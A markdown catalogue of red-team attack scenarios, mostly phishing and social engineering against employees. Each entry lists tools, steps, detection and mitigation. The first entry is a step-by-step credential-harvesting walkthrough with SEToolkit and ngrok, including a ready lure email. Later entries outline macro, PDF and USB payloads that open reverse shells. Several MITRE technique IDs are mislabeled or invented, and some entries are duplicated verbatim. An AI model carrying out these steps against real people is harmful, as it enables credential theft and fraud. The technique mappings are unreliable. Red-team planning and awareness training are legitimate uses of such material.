# Red Team Attacks

## Email Phishing – Fake Login Page (Credential Harvesting)

- **Attack Type**: Credential Harvesting via Email
- **Target**: Human (Email User)
- **Vulnerability**: Lack of email validation, social engineering susceptibility
- **MITRE**: T1566.001 – Phishing: Spearphishing Attachment
- **Impact**: User credential theft; potential full account compromise
- **Tools**: Kali Linux, SEToolkit, Ngrok
- **Scenario**: The attacker sends a fake security alert email containing a malicious link to a cloned login page (e.g., Outlook or Gmail). When the victim clicks the link and enters credentials, the attacker captures them.
- **Attack Steps**: 1. Boot up a Kali Linux system.2. Open terminal and run sudo setoolkit.3. In SEToolkit menu, select: 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester Attack Method → 2) Site Cloner.4. Enter your local IP address (e.g., 127.0.0.1) or public IP if hosted online.5. When prompted, input the site you want to clone, e.g., https://accounts.google.com.6. SET will now clone the login page and host it locally on port 80.7. Open a new terminal and start Ngrok to expose the page publicly: ./ngrok http 80.8. Ngrok will provide a public HTTPS link (e.g., https://abc123.ngrok.io).9. Create a fake phishing email like: “⚠️ Your email was accessed from an unknown device. Verify now: https://abc123.ngrok.io”.10. Send this email using a tool like SendEmail, GoPhish, or manually.11. When the victim clicks and enters credentials on the cloned page, their input is captured in the terminal running SEToolkit.
- **Detection**: Email filtering, user reports, anomaly detection in login behavior
- **Solution**: Use of email gateways, enforce MFA, educate users on phishing signs
- **Tags**: #RedTeam #InitialAccess #Phishing #CredentialHarvesting #SEToolkit #Ngrok #SocialEngineering #MITRE_T1566_001 #CyberAttack #EmailSecurity #LiveAttackSimulation

## Voice Phishing – Fake IT Support Call

- **Attack Type**: Voice Phishing (Vishing)
- **Target**: Human (Employee)
- **Vulnerability**: Trust in authority, lack of verification
- **MITRE**: T1598.004 – Phishing: Voice
- **Impact**: Credential theft, lateral movement
- **Tools**: Burner phone, VoIP tools
- **Scenario**: Attacker impersonates IT staff over the phone and tricks the user into revealing login credentials.
- **Attack Steps**: 1. Research target employee.2. Call pretending to be internal IT.3. Claim urgent password reset.4. Socially engineer credentials.5. Attempt access.
- **Detection**: Call pattern anomalies, user reports
- **Solution**: Employee training, caller ID checks, MFA
- **Tags**: RedTeam, InitialAccess, Vishing, VoicePhishing, SocialEngineering, MITRE_T1598_004, CyberAttack, LiveAttackSimulation

## Malicious PDF via Email

- **Attack Type**: Email Attachment Exploit
- **Target**: Human (Email User)
- **Vulnerability**: Email attachment validation bypass
- **MITRE**: T1566.001
- **Impact**: Remote code execution, system compromise
- **Tools**: EvilPDF, Metasploit, Outlook
- **Scenario**: A malicious PDF file with embedded JavaScript is emailed to the victim. Opening it executes malware.
- **Attack Steps**: 1. Generate PDF payload.2. Embed exploit using EvilPDF.3. Email it using spoofed sender.4. Once opened, payload executes and connects back.
- **Detection**: Email scanning, AV alerts
- **Solution**: Disable macros, scan attachments, train users
- **Tags**: RedTeam, InitialAccess, PDFExploit, EmailPhishing, Metasploit, MITRE_T1566_001, MalwareDelivery

## Drive-by Download via Fake Browser Update

- **Attack Type**: Drive-by Download
- **Target**: Human (Web User)
- **Vulnerability**: Outdated browser, user trust
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: RAT installation, remote control
- **Tools**: Gophish, Empire, Browser Exploit Kit
- **Scenario**: A fake "browser update required" popup leads to a malware dropper download.
- **Attack Steps**: 1. Clone a website.2. Insert fake "update required" JS.3. Host with C2.4. Redirect victim.5. Payload silently installs RAT.
- **Detection**: EDR monitoring, DNS filtering
- **Solution**: Patch browsers, block untrusted domains, restrict downloads
- **Tags**: RedTeam, InitialAccess, DriveBy, RAT, Empire, FakeUpdate, SocialEngineering, MITRE_T1189

## Malicious USB Drop

- **Attack Type**: Physical Access + HID Injection
- **Target**: Human (On-site Staff)
- **Vulnerability**: Curiosity, lack of USB restrictions
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Remote access, privilege escalation
- **Tools**: Rubber Ducky, Bash Bunny
- **Scenario**: Attacker drops infected USBs in parking lots. Curious users plug them in, running malicious code.
- **Attack Steps**: 1. Load USB with autorun payload or HID script.2. Drop in target area.3. Wait for victim to plug in.4. Script injects commands to open backdoor.
- **Detection**: USB logging, restricted ports
- **Solution**: Disable USB, user education, endpoint control
- **Tags**: RedTeam, InitialAccess, USBDrop, HID, RubberDucky, MITRE_T1200, SocialEngineering, LiveAttack

## Exploit Public-Facing Web App

- **Attack Type**: Web Exploitation
- **Target**: Server (Web App)
- **Vulnerability**: Unpatched vulnerability
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Shell access, lateral movement
- **Tools**: Metasploit, Nmap, Burp Suite
- **Scenario**: An attacker exploits an unpatched web app (e.g., vulnerable Apache Struts) to gain shell access.
- **Attack Steps**: 1. Scan with Nmap.2. Discover vulnerable app.3. Launch Metasploit module.4. Gain reverse shell.5. Escalate privileges.
- **Detection**: WAF logs, behavioral analytics
- **Solution**: Patch management, WAF, runtime protection
- **Tags**: RedTeam, InitialAccess, WebExploit, Metasploit, MITRE_T1190, ShellAccess

## Office Macro Malware

- **Attack Type**: Malicious Office Macro
- **Target**: Human (Employee)
- **Vulnerability**: Macro-enabled Office usage
- **MITRE**: T1566.001, T1203
- **Impact**: Remote shell, data theft
- **Tools**: MSFVenom, Excel, PowerShell
- **Scenario**: An Excel sheet with a macro payload is sent to users, luring them with fake invoice data.
- **Attack Steps**: 1. Create Excel file with macro.2. Use MSFVenom to embed payload.3. Social engineer with “urgent invoice”.4. When macro runs, shell opens.
- **Detection**: AV scan, macro behavior detection
- **Solution**: Disable macros, scan attachments, user training
- **Tags**: RedTeam, InitialAccess, MacroMalware, MSFVenom, ExcelExploit, MITRE_T1203, MITRE_T1566_001

## Remote Desktop Brute Force

- **Attack Type**: Credential Brute Force
- **Target**: Server (RDP)
- **Vulnerability**: Weak credentials, exposed ports
- **MITRE**: T1110.001 – Brute Force: Password Guessing
- **Impact**: Remote login, data exfiltration
- **Tools**: Hydra, Ncrack, Nmap
- **Scenario**: Attacker scans for exposed RDP ports and brute-forces login with password lists.
- **Attack Steps**: 1. Scan with Nmap.2. Identify RDP (port 3389).3. Run Hydra with common password list.4. Gain access.5. Escalate privileges.
- **Detection**: Login attempt logs, account lockouts
- **Solution**: Enforce strong passwords, lockout policy, restrict RDP access
- **Tags**: RedTeam, InitialAccess, RDP, BruteForce, Hydra, Ncrack, MITRE_T1110_001

## Fake Software Installer via Torrent

- **Attack Type**: Trojanized Software Download
- **Target**: Human (Torrent User)
- **Vulnerability**: Trust in cracked software sources
- **MITRE**: T1204.002 – User Execution: Malicious File
- **Impact**: Spyware installation, persistent access
- **Tools**: Inno Setup, SpyNote, Torrent
- **Scenario**: A cracked software installer is uploaded to torrent sites. When downloaded, it installs spyware.
- **Attack Steps**: 1. Bind spyware with installer.2. Upload to torrent with high seeds.3. Victim downloads and installs.4. Spyware runs silently.
- **Detection**: Behavioral AV, DNS logs
- **Solution**: Block torrents, software whitelisting, awareness training
- **Tags**: RedTeam, InitialAccess, Trojan, Spyware, Torrent, MITRE_T1204_002

## Malvertising Campaign

- **Attack Type**: Malvertising / Exploit Kit
- **Target**: Human (Web User)
- **Vulnerability**: Ad-based delivery, no click awareness
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Malware dropper, RAT installation
- **Tools**: RIG EK, Cobalt Strike, Ad Network
- **Scenario**: Victim clicks on a malicious ad, triggering an exploit kit chain leading to malware dropper.
- **Attack Steps**: 1. Register ad on network.2. Inject redirect to exploit kit.3. Serve payload.4. Exploit executes and installs malware.
- **Detection**: Network filtering, ad blocklists
- **Solution**: Use ad blockers, patch browsers and plugins
- **Tags**: RedTeam, InitialAccess, Malvertising, ExploitKit, CobaltStrike, MITRE_T1189

## Compromised Third-Party Software Update

- **Attack Type**: Supply Chain Compromise
- **Target**: Server/System
- **Vulnerability**: Lack of software update validation
- **MITRE**: T1195.002 – Supply Chain Compromise
- **Impact**: Persistent access, full compromise
- **Tools**: DNSPoison, Custom Payloads
- **Scenario**: Attacker compromises the update server of a third-party software. Victim installs a legit update that contains backdoor code.
- **Attack Steps**: 1. Gain access to update channel.2. Modify payload.3. Victim installs the update.4. Attacker gains backdoor access.
- **Detection**: Update monitoring, code diff checks
- **Solution**: Verify updates via hash/signatures, use secure channels
- **Tags**: RedTeam, InitialAccess, SupplyChain, MITRE_T1195_002, Backdoor, CompromisedUpdate

## Exploit via Compromised Partner Account

- **Attack Type**: BEC + Partner Compromise
- **Target**: Human (Employee)
- **Vulnerability**: Trust in third-party sources
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Credential theft, initial access
- **Tools**: O365, Evilginx, GoPhish
- **Scenario**: A trusted vendor’s email account is compromised and used to send malware to internal employees.
- **Attack Steps**: 1. Compromise partner mailbox.2. Craft targeted email with malware or fake invoice.3. Send to internal target.4. Execute on click.
- **Detection**: Mail header inspection, partner risk scoring
- **Solution**: Vendor risk audits, MFA for all accounts
- **Tags**: RedTeam, InitialAccess, BEC, PartnerCompromise, GoPhish, MITRE_T1078

## Fake Job Application Email with Resume Malware

- **Attack Type**: Spearphishing Resume Payload
- **Target**: Human (HR Staff)
- **Vulnerability**: Macro-enabled Office use
- **MITRE**: T1566.001 – Spearphishing
- **Impact**: Remote shell, privilege escalation
- **Tools**: MS Word, PowerShell, Empire
- **Scenario**: HR receives a resume.doc attachment with embedded macro that opens PowerShell reverse shell.
- **Attack Steps**: 1. Create malicious .doc file.2. Embed PowerShell command.3. Email to HR.4. On macro enable, gain shell access.
- **Detection**: Attachment inspection, macro sandboxing
- **Solution**: Disable macros, alert HR to common tactics
- **Tags**: RedTeam, InitialAccess, Spearphishing, ResumeMalware, PowerShell, Empire, MITRE_T1566_001

## MS Teams Chat Phishing

- **Attack Type**: Collaboration Tool Exploitation
- **Target**: Human (Employee)
- **Vulnerability**: Blind trust in internal chat tools
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Session hijacking, lateral movement
- **Tools**: Evilginx, Teams, O365
- **Scenario**: Malicious link is sent via MS Teams chat pretending to be internal IT support.
- **Attack Steps**: 1. Register phishing domain.2. Spoof Teams profile.3. Send fake alert.4. Victim clicks and enters credentials.5. Session token stolen.
- **Detection**: Conditional access alerts, Teams logs
- **Solution**: Train users, restrict file/link previews
- **Tags**: RedTeam, InitialAccess, MS_Teams, Phishing, Evilginx, MITRE_T1566_002

## Malicious QR Code in Physical Location

- **Attack Type**: Physical Social Engineering
- **Target**: Human (Visitor/Staff)
- **Vulnerability**: Blind trust in public QR codes
- **MITRE**: T1598 – Phishing via QR Code
- **Impact**: Credential theft
- **Tools**: Canva (QR gen), Ngrok, SEToolkit
- **Scenario**: A malicious QR code posted in public redirects victim to fake login portal.
- **Attack Steps**: 1. Clone login page with SET.2. Host using Ngrok.3. Generate QR pointing to Ngrok.4. Post QR in office as “Wi-Fi access”.5. Capture credentials.
- **Detection**: QR scanning logs, employee reporting
- **Solution**: Don’t allow unauthorized signage, educate staff
- **Tags**: RedTeam, InitialAccess, QRPhishing, SocialEngineering, SEToolkit, MITRE_T1598

## Exploit Printer Firmware to Gain Network Foothold

- **Attack Type**: Embedded Device Exploitation
- **Target**: Device (Printer)
- **Vulnerability**: Unpatched firmware
- **MITRE**: T1200 – Peripheral Exploitation
- **Impact**: Internal network access
- **Tools**: PrinterSploit, Nmap
- **Scenario**: Exploiting unpatched firmware in a network printer to gain access to the internal network.
- **Attack Steps**: 1. Identify printer via network scan.2. Exploit firmware bug.3. Upload reverse shell.4. Pivot inside network.
- **Detection**: Device monitoring, firmware logs
- **Solution**: Patch firmware, isolate printers, monitor traffic
- **Tags**: RedTeam, InitialAccess, FirmwareExploit, PrinterHack, MITRE_T1200

## Google Calendar Invite Phishing

- **Attack Type**: Calendar Link Phishing
- **Target**: Human (Employee)
- **Vulnerability**: Blind trust in calendar invites
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Credential harvesting
- **Tools**: Google Calendar, Ngrok
- **Scenario**: Victim receives a calendar invite with a link to a fake login portal.
- **Attack Steps**: 1. Clone login site.2. Host with Ngrok.3. Create fake meeting.4. Insert phishing link in invite.5. User clicks, enters credentials.
- **Detection**: Link filters, calendar anomaly detection
- **Solution**: Block external invites, train staff
- **Tags**: RedTeam, InitialAccess, CalendarPhishing, SocialEngineering, Ngrok, MITRE_T1566_002

## Wi-Fi Evil Twin Attack

- **Attack Type**: Wireless Attack
- **Target**: Human (Wi-Fi User)
- **Vulnerability**: Open Wi-Fi connection
- **MITRE**: T1557 – Adversary-in-the-Middle
- **Impact**: Credential theft, session hijacking
- **Tools**: WiFi Pineapple, Bettercap
- **Scenario**: Attacker sets up rogue Wi-Fi with same SSID and captures user credentials during captive portal login.
- **Attack Steps**: 1. Clone target SSID.2. Deauth clients from legit AP.3. Users auto-connect to rogue AP.4. Fake captive portal captures credentials.
- **Detection**: Wireless IDS, MAC filtering
- **Solution**: Disable auto-connect, use VPN, monitor rogue APs
- **Tags**: RedTeam, InitialAccess, EvilTwin, WiFiAttack, MITRE_T1557, Bettercap, RogueAP

## Exploiting Misconfigured S3 Bucket

- **Attack Type**: Cloud Misconfiguration
- **Target**: Cloud Infrastructure
- **Vulnerability**: Poor access control on cloud storage
- **MITRE**: T1530 – Data from Cloud Storage
- **Impact**: Cloud data theft, access chaining
- **Tools**: AWS CLI, S3Scanner
- **Scenario**: A public S3 bucket exposes sensitive credentials or scripts, used for further exploitation.
- **Attack Steps**: 1. Scan for open S3 buckets.2. Locate credentials or scripts.3. Use creds to access internal systems.4. Escalate privileges.
- **Detection**: Bucket scanning, config reviews
- **Solution**: Apply bucket policies, restrict public access
- **Tags**: RedTeam, InitialAccess, S3Bucket, CloudExploit, AWSCLI, MITRE_T1530

## Remote Code Execution via GitHub Actions Workflow

- **Attack Type**: CI/CD Pipeline Exploitation
- **Target**: Developer Workflow
- **Vulnerability**: Insufficient PR/workflow validation
- **MITRE**: T1559 – Inter-Process Injection
- **Impact**: Pipeline compromise, supply chain breach
- **Tools**: GitHub, GitHub Actions, ngrok
- **Scenario**: Malicious PR triggers GitHub Action workflow to execute attacker's code in build runner.
- **Attack Steps**: 1. Fork target repo.2. Add malicious GitHub Actions.3. Submit pull request.4. Workflow runs attacker’s code.5. Exfil data via ngrok tunnel.
- **Detection**: CI/CD logs, PR reviews
- **Solution**: Use pull_request_target safely, review YAML carefully
- **Tags**: RedTeam, InitialAccess, GitHub, CI_CD_Attack, WorkflowAbuse, MITRE_T1559

## CEO Fraud via Spoofed Email

- **Attack Type**: Executive Impersonation (BEC)
- **Target**: Finance Staff
- **Vulnerability**: Email spoofing, trust in senior authority
- **MITRE**: T1585.002 – Email Spoofing
- **Impact**: Financial fraud, potential data exposure
- **Tools**: GoPhish, SPF Bypass
- **Scenario**: Attacker spoofs CEO's email and tricks the finance team to urgently wire money.
- **Attack Steps**: 1. Harvest CEO details from LinkedIn.2. Register lookalike domain.3. Spoof email using CEO name.4. Send urgent wire transfer request.5. Await victim action.
- **Detection**: DMARC/SPF records, keyword alerts
- **Solution**: Enforce verification calls, protect domains with SPF/DKIM
- **Tags**: RedTeam, SpearPhishing, ExecutiveFraud, CEOScam, MITRE_T1585_002, BEC

## Targeted Resume Delivery to HR with Payload

- **Attack Type**: Malicious Document Delivery
- **Target**: HR Team
- **Vulnerability**: Macro-enabled Office usage
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Remote access, lateral movement
- **Tools**: MS Word, Macro, Empire
- **Scenario**: Attacker sends fake job application with weaponized resume to HR inbox.
- **Attack Steps**: 1. Create malicious .doc file.2. Embed macro reverse shell.3. Target HR emails with convincing content.4. On macro execution, attacker gains shell.
- **Detection**: Email scan, behavior-based macro detection
- **Solution**: Disable macros, scan resume attachments
- **Tags**: RedTeam, SpearPhishing, ResumeMalware, HRAttack, MacroPayload, MITRE_T1566_001

## Credential Harvesting via Fake Zoom Invite

- **Attack Type**: Fake Meeting Link
- **Target**: Executives
- **Vulnerability**: Trust in meeting platforms
- **MITRE**: T1566.002 – Spearphishing via Service
- **Impact**: Credential theft, ATO (Account Takeover)
- **Tools**: SEToolkit, Ngrok, GoPhish
- **Scenario**: Fake Zoom invite is sent from spoofed internal address, leading to cloned login page.
- **Attack Steps**: 1. Clone Zoom login page.2. Host with Ngrok.3. Craft fake invite email.4. Send to specific executive team.5. Steal credentials via SEToolkit.
- **Detection**: Login anomaly alerts, link inspection
- **Solution**: Enforce MFA, validate Zoom links, educate staff
- **Tags**: RedTeam, SpearPhishing, ZoomPhishing, CredentialHarvesting, MITRE_T1566_002, FakeMeeting

## Malware in Strategic Report to Defense Contractor

- **Attack Type**: Nation-State Targeting with Malware
- **Target**: Defense Executives
- **Vulnerability**: PDF parsing vulnerability, targeted persuasion
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: National security data access
- **Tools**: PDF Exploit Kit, Metasploit
- **Scenario**: A fake defense strategy PDF with malware is sent to a defense contractor executive.
- **Attack Steps**: 1. Build fake strategic report.2. Embed malware in PDF.3. Send as intelligence analyst.4. Target C-suite of defense firm.5. Payload executes on open.
- **Detection**: Email filters, endpoint AV
- **Solution**: PDF sandboxing, limit PDF rendering tools
- **Tags**: RedTeam, SpearPhishing, NationState, PDFExploit, DefenseTarget, MITRE_T1566_001

## Google Drive Share Phish

- **Attack Type**: Cloud Share Link Abuse
- **Target**: Cloud Users
- **Vulnerability**: Trust in shared document links
- **MITRE**: T1566.002 – Service Phishing
- **Impact**: Credential theft, token hijacking
- **Tools**: Evilginx, GDrive, Ngrok
- **Scenario**: Victim receives a shared Google Drive file prompting login on fake Google login page.
- **Attack Steps**: 1. Clone Google login page.2. Use Evilginx to steal tokens.3. Share fake Drive file.4. Victim logs in to view.5. Attacker steals credentials.
- **Detection**: OAuth monitoring, suspicious domain blocking
- **Solution**: Block public shares, enforce MFA
- **Tags**: RedTeam, SpearPhishing, GoogleDrive, Evilginx, CredentialHarvesting, MITRE_T1566_002

## Fake Helpdesk Chat Support via Teams

- **Attack Type**: Chat Phishing
- **Target**: Internal Staff
- **Vulnerability**: Blind trust in internal chat
- **MITRE**: T1566.002 – Collaboration App Phishing
- **Impact**: Privilege escalation, lateral movement
- **Tools**: Teams, Evilginx
- **Scenario**: Fake IT support uses Teams chat to gain credentials for password reset.
- **Attack Steps**: 1. Create internal-looking Teams account.2. Message target pretending to reset password.3. Share fake reset link.4. Capture credentials.5. Use for further access.
- **Detection**: Teams logging, access alerting
- **Solution**: Train users, restrict external access in chat tools
- **Tags**: RedTeam, SpearPhishing, MS_Teams, ChatPhishing, MITRE_T1566_002

## Security Conference Invite with Weaponized Flyer

- **Attack Type**: Event-Based Social Engineering
- **Target**: Researchers
- **Vulnerability**: Interest in conferences, PDF handling
- **MITRE**: T1566.001 – Malicious PDF Attachment
- **Impact**: Malware execution, espionage
- **Tools**: Adobe PDF Exploit, Cobalt Strike
- **Scenario**: A fake invitation to an infosec conference is sent with a PDF flyer that drops malware.
- **Attack Steps**: 1. Design fake PDF flyer.2. Embed reverse shell.3. Target researchers and speakers.4. Deliver via personal LinkedIn email.5. Payload activates silently.
- **Detection**: AV alerts, document behavior analysis
- **Solution**: Use VMs for opening unknown files, validate senders
- **Tags**: RedTeam, SpearPhishing, PDFMalware, ConferenceBait, MITRE_T1566_001

## Fake Job Offer via LinkedIn

- **Attack Type**: Social Media–Driven Exploit
- **Target**: Tech Employee
- **Vulnerability**: Trust in recruiters on LinkedIn
- **MITRE**: T1589.001 – Social Engineering
- **Impact**: Remote shell, persistent access
- **Tools**: LinkedIn, MacroExcel, MSFVenom
- **Scenario**: A recruiter contacts the target via LinkedIn and sends a malicious job offer file.
- **Attack Steps**: 1. Create recruiter profile.2. Target tech staff.3. Send Excel with macro payload.4. When opened, shell is established.
- **Detection**: Macro blocking, unusual file source alerts
- **Solution**: Warn about job scams, train technical staff
- **Tags**: RedTeam, SpearPhishing, LinkedInHack, MacroAttack, MITRE_T1589_001

## Fake Compliance Audit Email

- **Attack Type**: Internal Policy-Based Phish
- **Target**: Compliance Officer
- **Vulnerability**: Internal trust exploitation
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Account compromise
- **Tools**: SEToolkit, Gmail Clone, Ngrok
- **Scenario**: Target receives email from fake compliance department requesting credential login to review audit results.
- **Attack Steps**: 1. Clone Gmail login.2. Host on Ngrok.3. Craft email with audit urgency.4. User clicks link and logs in.5. Capture credentials.
- **Detection**: Email header analysis, login location detection
- **Solution**: Audit internal communications protocol
- **Tags**: RedTeam, SpearPhishing, CompliancePhish, FakeAudit, CredentialHarvesting, MITRE_T1566_001

## Intellectual Property Theft via Impersonated Vendor

- **Attack Type**: Vendor Impersonation
- **Target**: Product Manager
- **Vulnerability**: Lack of vendor communication verification
- **MITRE**: T1585.001 – Impersonation: Trusted Relationship
- **Impact**: IP theft, breach of confidentiality
- **Tools**: Spoofed Email, OSINT, Doc Request
- **Scenario**: Attacker impersonates trusted vendor and asks for confidential documents as part of “security audit.”
- **Attack Steps**: 1. Find real vendor name.2. Register lookalike email.3. Contact product manager.4. Request files under pretense.5. Exfiltrate IP.
- **Detection**: Vendor behavior baselines, sender identity checks
- **Solution**: Define vendor communication channels, educate staff
- **Tags**: RedTeam, SpearPhishing, VendorFraud, IPTheft, MITRE_T1585_001

## Vendor Legal Notice with Macro-Enabled Doc

- **Attack Type**: Legal-Themed Document Attack
- **Target**: Legal Team
- **Vulnerability**: Blind trust in legal notices
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Remote code execution
- **Tools**: Word, MSFvenom
- **Scenario**: Attacker impersonates vendor legal team and sends a DOC file with malicious macros.
- **Attack Steps**: 1. Create legal threat email.2. Attach macro-enabled Word document.3. Send to legal/finance team.4. Upon open, reverse shell activates.
- **Detection**: AV/macro inspection, legal header validation
- **Solution**: Disable macros, train legal team
- **Tags**: RedTeam, SpearPhishing, LegalScam, VendorImpersonation, MITRE_T1566_001

## Fake AWS Billing Alert Email

- **Attack Type**: Cloud Service Impersonation
- **Target**: Cloud Admin
- **Vulnerability**: Trust in AWS alerts
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Cloud access, resource manipulation
- **Tools**: AWS Clone, Evilginx, Ngrok
- **Scenario**: Fake AWS billing alert leads user to a fake AWS login page.
- **Attack Steps**: 1. Clone AWS login.2. Send alert-style email.3. Include Ngrok phishing URL.4. Capture credentials via Evilginx.5. Use keys to access resources.
- **Detection**: IAM activity logs, unusual login alert
- **Solution**: Train admins, enforce device-based MFA
- **Tags**: RedTeam, SpearPhishing, AWSPhishing, Evilginx, CloudSecurity, MITRE_T1566_002

## SharePoint File Access Request with Fake Link

- **Attack Type**: Collaboration Platform Exploitation
- **Target**: SharePoint Users
- **Vulnerability**: Trust in internal resource links
- **MITRE**: T1566.002 – Phishing via Collaboration Tool
- **Impact**: Credential theft
- **Tools**: SEToolkit, Ngrok, O365 Spoofing
- **Scenario**: Attacker sends fake file access request email that links to a cloned SharePoint login.
- **Attack Steps**: 1. Clone SharePoint login.2. Send internal-looking email request.3. Link to Ngrok page.4. Credentials stolen via SEToolkit.
- **Detection**: OAuth token monitoring, login pattern tracking
- **Solution**: Block non-verified links, use domain filtering
- **Tags**: RedTeam, SpearPhishing, SharePointPhish, CollaborationAbuse, MITRE_T1566_002

## Fake Procurement Request from Internal Team

- **Attack Type**: Internal Impersonation
- **Target**: Procurement Team
- **Vulnerability**: Weak sender verification
- **MITRE**: T1585.002 – Internal Impersonation
- **Impact**: Vendor account takeover
- **Tools**: Email Spoofer, GoPhish
- **Scenario**: Impersonates an internal procurement team asking for login credentials to access vendor portal.
- **Attack Steps**: 1. Create internal user spoof email.2. Request urgent vendor login.3. Use phishing page to steal credentials.4. Use stolen access for lateral movement.
- **Detection**: Internal email monitoring, anomaly detection
- **Solution**: Internal mail tagging, require portal login via SSO
- **Tags**: RedTeam, SpearPhishing, ProcurementPhish, InternalFraud, MITRE_T1585_002

## Fake Cybersecurity Audit Request with Survey Link

- **Attack Type**: Survey-Based Data Theft
- **Target**: Security Admins
- **Vulnerability**: Trust in security assessments
- **MITRE**: T1566.002 – Web Form Phishing
- **Impact**: Data breach, infrastructure knowledge leak
- **Tools**: Google Forms, GoPhish
- **Scenario**: Victim receives fake cyber audit request with embedded link to a malicious survey that collects sensitive details.
- **Attack Steps**: 1. Craft legit-looking survey page.2. Ask for internal tool credentials.3. Send to security and admin staff.4. Collect confidential data.
- **Detection**: Email/survey link pattern monitoring
- **Solution**: Use official survey platforms, avoid form-based auth requests
- **Tags**: RedTeam, SpearPhishing, SurveyScam, CyberAuditFraud, MITRE_T1566_002

## COVID-19 HR Policy Phishing Campaign

- **Attack Type**: Health Event-Themed Phishing
- **Target**: All Employees
- **Vulnerability**: Sensitivity to health topics
- **MITRE**: T1566.001 – Event-Based Spearphishing
- **Impact**: Account takeover, employee panic
- **Tools**: Ngrok, SEToolkit
- **Scenario**: Fake email claims new HR policy around COVID-19 and links to malicious HR portal.
- **Attack Steps**: 1. Clone HR login portal.2. Send fake HR announcement.3. Redirect users to fake login page.4. Capture usernames and passwords.
- **Detection**: HR communication whitelisting, link scanning
- **Solution**: Internal newsletter protocols, verified sender practices
- **Tags**: RedTeam, SpearPhishing, COVIDScam, HRPhishing, MITRE_T1566_001

## Fake Remote Work Access Portal

- **Attack Type**: VPN Login Harvesting
- **Target**: Remote Employees
- **Vulnerability**: Urgency around remote access
- **MITRE**: T1566.002 – Infrastructure Credential Theft
- **Impact**: VPN access, infrastructure entry
- **Tools**: Fake VPN UI, GoPhish, Ngrok
- **Scenario**: Employees are sent fake instructions for a “new VPN portal” and asked to log in.
- **Attack Steps**: 1. Clone VPN login UI.2. Host via Ngrok.3. Send announcement email from spoofed IT address.4. Capture VPN credentials.
- **Detection**: VPN log monitoring, MFA enforcement
- **Solution**: Use trusted portals, block fake subdomains
- **Tags**: RedTeam, SpearPhishing, VPNPhishing, RemoteAccessHack, MITRE_T1566_002

## Dropbox Shared Link to Malicious Script

- **Attack Type**: Cloud Link Delivery
- **Target**: Project Managers
- **Vulnerability**: Trust in shared cloud documents
- **MITRE**: T1566.002 – Cloud Service Abuse
- **Impact**: Remote access, data theft
- **Tools**: Dropbox, Word Macro, GoPhish
- **Scenario**: Target receives Dropbox link to shared script which includes credential-stealing macro.
- **Attack Steps**: 1. Upload malicious Word script to Dropbox.2. Share via email as project file.3. On open, macro steals credentials or opens reverse shell.
- **Detection**: Dropbox link validation, content sandboxing
- **Solution**: Block shared link previews, inspect macros
- **Tags**: RedTeam, SpearPhishing, DropboxAbuse, SharedLinkHack, MITRE_T1566_002

## Payment Confirmation Phishing with Fake Receipt

- **Attack Type**: Financial Transaction Trap
- **Target**: Finance Team
- **Vulnerability**: Urgency in payment scenarios
- **MITRE**: T1566.001 – Financial Attachment Phishing
- **Impact**: Backdoor access, financial system entry
- **Tools**: Excel Macro, PDF Exploit
- **Scenario**: Finance staff receive a fake “receipt” from a vendor with embedded malware disguised as payment confirmation.
- **Attack Steps**: 1. Create fake invoice or receipt.2. Embed payload in Excel macro.3. Target accounts team.4. Activate on open.5. Establish backdoor.
- **Detection**: Transaction alerting, attachment behavior monitoring
- **Solution**: Strong finance validation workflows
- **Tags**: RedTeam, SpearPhishing, PaymentPhish, FinanceHack, MITRE_T1566_001

## Acquisition News Phishing for M&A Insider Access

- **Attack Type**: M&A-Themed Executive Phishing
- **Target**: Executives
- **Vulnerability**: Sensitivity to insider events
- **MITRE**: T1566.002 – Strategic Document Phishing
- **Impact**: Insider access, business leak
- **Tools**: DocuSign Clone, Ngrok, GoPhish
- **Scenario**: Fake email announces a company acquisition and prompts C-level login to access documents.
- **Attack Steps**: 1. Create fake DocuSign page.2. Link document to login trap.3. Target executives during sensitive business periods.4. Capture credentials.
- **Detection**: Executive communication restrictions
- **Solution**: Protect domains, alert on login location change
- **Tags**: RedTeam, SpearPhishing, InsiderAccess, ExecPhish, MITRE_T1566_002

## Vendor Legal Notice with Macro-Enabled Doc

- **Attack Type**: Legal-Themed Document Attack
- **Target**: Legal Team
- **Vulnerability**: Blind trust in legal notices
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Remote code execution
- **Tools**: Word, MSFvenom
- **Scenario**: Attacker impersonates vendor legal team and sends a DOC file with malicious macros.
- **Attack Steps**: 1. Create legal threat email.2. Attach macro-enabled Word document.3. Send to legal/finance team.4. Upon open, reverse shell activates.
- **Detection**: AV/macro inspection, legal header validation
- **Solution**: Disable macros, train legal team
- **Tags**: RedTeam, SpearPhishing, LegalScam, VendorImpersonation, MITRE_T1566_001

## Fake AWS Billing Alert Email

- **Attack Type**: Cloud Service Impersonation
- **Target**: Cloud Admin
- **Vulnerability**: Trust in AWS alerts
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Cloud access, resource manipulation
- **Tools**: AWS Clone, Evilginx, Ngrok
- **Scenario**: Fake AWS billing alert leads user to a fake AWS login page.
- **Attack Steps**: 1. Clone AWS login.2. Send alert-style email.3. Include Ngrok phishing URL.4. Capture credentials via Evilginx.5. Use keys to access resources.
- **Detection**: IAM activity logs, unusual login alert
- **Solution**: Train admins, enforce device-based MFA
- **Tags**: RedTeam, SpearPhishing, AWSPhishing, Evilginx, CloudSecurity, MITRE_T1566_002

## SharePoint File Access Request with Fake Link

- **Attack Type**: Collaboration Platform Exploitation
- **Target**: SharePoint Users
- **Vulnerability**: Trust in internal resource links
- **MITRE**: T1566.002 – Phishing via Collaboration Tool
- **Impact**: Credential theft
- **Tools**: SEToolkit, Ngrok, O365 Spoofing
- **Scenario**: Attacker sends fake file access request email that links to a cloned SharePoint login.
- **Attack Steps**: 1. Clone SharePoint login.2. Send internal-looking email request.3. Link to Ngrok page.4. Credentials stolen via SEToolkit.
